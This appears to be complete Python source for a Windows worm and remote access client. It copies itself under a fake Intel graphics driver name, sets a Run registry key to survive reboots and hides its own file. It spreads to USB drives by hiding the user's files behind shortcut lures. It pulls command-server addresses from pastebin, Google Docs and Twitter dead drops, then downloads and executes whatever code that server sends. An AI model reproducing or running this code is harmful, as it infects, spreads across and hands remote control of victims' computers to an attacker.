
# -*- coding: utf-8 -*-
# !/usr/bin/python
import socket
import time
import ast
import sys
import os
import platform
from ctypes.wintypes import MSG
from ctypes import wintypes, windll
import ctypes
import threading
import subprocess
import sched
import datetime
import zlib
import base64
import urllib
import shutil

url_list = ['http://pastebin.com/raw/HMV0Hy2B', 'https://docs.google.com/document/d/1a8KtmOEq9cldSTfzO3DoNcjG7gDPV6w4HwSNUkNOvHc', 'https://twitter.com/kaurikasd']
ACTIVE = False
_SHGetFolderPath = windll.shell32.SHGetFolderPathW
_SHGetFolderPath.argtypes = [wintypes.HWND, ctypes.c_int, wintypes.HANDLE, wintypes.DWORD, wintypes.LPCWSTR]
path_buf = wintypes.create_unicode_buffer(wintypes.MAX_PATH)
result = _SHGetFolderPath(0, 35, 0, 0, path_buf)
destination_folder = os.path.join(path_buf.value, 'Intel')
if not os.path.exists(destination_folder):
    os.makedirs(destination_folder)
destination_path = os.path.join(destination_folder, 'IntelGFX.exe')
file_name = sys.argv[0]

if not 'IntelGFX' in file_name:
    if not os.path.exists(destination_path):
        shutil.copy2(file_name, destination_path)
    if windll.shell32.IsUserAnAdmin() == 1:
        reg_payload = r'REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Intel(R) Graphic Driver Service" /t REG_SZ /F /D "{}"'.format(destination_path)
    else:
        reg_payload = r'REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Intel(R) Graphic Driver Service" /t REG_SZ /F /D "{}"'.format(destination_path)
    subprocess.Popen(reg_payload)

    attrib_payload = r'attrib +h +s %s' % destination_path
    subprocess.Popen(attrib_payload)
    sys.exit(0)


class UsbSpread(threading.Thread):
    def run(self):
        while 1:
            bitmask = ctypes.windll.kernel32.GetLogicalDrives()
            for letter in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
                drive = u'{}:\\'.format(letter)
                if bitmask & 1 and ctypes.windll.kernel32.GetDriveTypeW(drive) == 2:
                    try:
                        os.chdir(drive)
                    except:
                        continue
                    volume_name_buffer = ctypes.create_unicode_buffer(1024)
                    ctypes.windll.kernel32.GetVolumeInformationW(drive, volume_name_buffer,
                                                   ctypes.sizeof(volume_name_buffer), None, None, None, None,
                                                   None)
                    if len(volume_name_buffer.value) == 0:
                        lnk_name = 'Removable Disk'
                    else:
                        lnk_name = volume_name_buffer.value
                    hidden_folder = os.path.join(drive, unichr(160))
                    if not os.path.exists(hidden_folder): os.mkdir(hidden_folder)
                    ctypes.windll.kernel32.SetFileAttributesW(hidden_folder, 2)

                    destination_file_path = os.path.join(drive, 'VolumeInformation.exe')
                    if not os.path.exists(destination_file_path):
                        shutil.copyfile(sys.argv[0], destination_file_path)
                        ctypes.windll.kernel32.SetFileAttributesW(destination_file_path, 2)

                    if not os.path.exists(os.path.join(drive, lnk_name + '.lnk')):
                        cmdline = ["cmd", "/q", "/k", "echo off"]
                        cmd = subprocess.Popen(cmdline, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                               stdin=subprocess.PIPE, shell=True)
                        batch = b''' @echo off
                                echo Set oWS = WScript.CreateObject("WScript.Shell") > CreateShortcut.vbs
                                echo sLinkFile = "%s" >> CreateShortcut.vbs
                                echo Set oLink = oWS.CreateShortcut(sLinkFile) >> CreateShortcut.vbs
                                echo oLink.TargetPath = "%s" >> CreateShortcut.vbs
                                echo oLink.WorkingDirectory = "%s" >> CreateShortcut.vbs
                                echo oLink.Description = "Social Updates" >> CreateShortcut.vbs
                                echo oLink.IconLocation = "%s" >> CreateShortcut.vbs
                                echo oLink.Save >> CreateShortcut.vbs
                                cscript CreateShortcut.vbs
                                del CreateShortcut.vbs
                                exit
                                ''' % (
                            os.path.join(drive, lnk_name + '.lnk'),
                            '%CD%\\VolumeInformation.exe',
                            '%CD%',
                            ','.join((os.path.join(os.environ['windir'], 'system32', 'shell32.dll'), '8'))
                        )
                        cmd.stdin.write(batch.encode('utf-8'))
                        cmd.stdin.flush()

                    for content in os.listdir(drive):
                        if not content.endswith('.lnk') and not content.endswith(
                                '.vbs') and not 'VolumeInformation' in content:
                            try:
                                shutil.move(content, hidden_folder)
                            except:
                                pass
                bitmask >>= 1
            time.sleep(3)

usbSpreader = UsbSpread()
usbSpreader.start()


def get_connection_creds():
    while 1:
        for url in url_list:
            try:
                req = urllib.urlopen(url).read()
                start = req.index('#!#!#!') + 6; end = req.index('#?#?#?')
                HOST, PORT = req[start:end].split(':')
                return HOST, PORT
            except:
                continue
        time.sleep(60)


while 1:
    try:
        HOST, PORT = get_connection_creds()
        GLOBAL_SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        GLOBAL_SOCKET.connect((HOST, int(PORT)))
        GLOBAL_SOCKET.recv(1024)
        GLOBAL_SOCKET.sendall(str({'mode': 'buildClient', 'from': 'client', 'payload': '', 'key': '', 'session_id': ''})+'[ENDOFMESSAGE]')
        received_data = ''
        payload = GLOBAL_SOCKET.recv(1024)
        while payload:
            received_data = received_data + payload
            if received_data.endswith('[ENDOFSOURCE]'):
                received_data = received_data[:-len('[ENDOFSOURCE]')]
                break
            else:
                payload = GLOBAL_SOCKET.recv(1024)
                continue
        try:
            ACTIVE = True

            # TODO: SOURCE
            exec received_data
            # TODO: END SOURCE

        except Exception as e:
            ACTIVE = False
            GLOBAL_SOCKET.sendall(str({'mode': 'buildClientError', 'from': 'client', 'payload': '%s' % e, 'key': '', 'session_id': ''})+'[ENDOFMESSAGE]')
            GLOBAL_SOCKET.close()
            del GLOBAL_SOCKET
            time.sleep(6)
    except socket.error as e:
        # TODO: TIMEOUT
        time.sleep(5)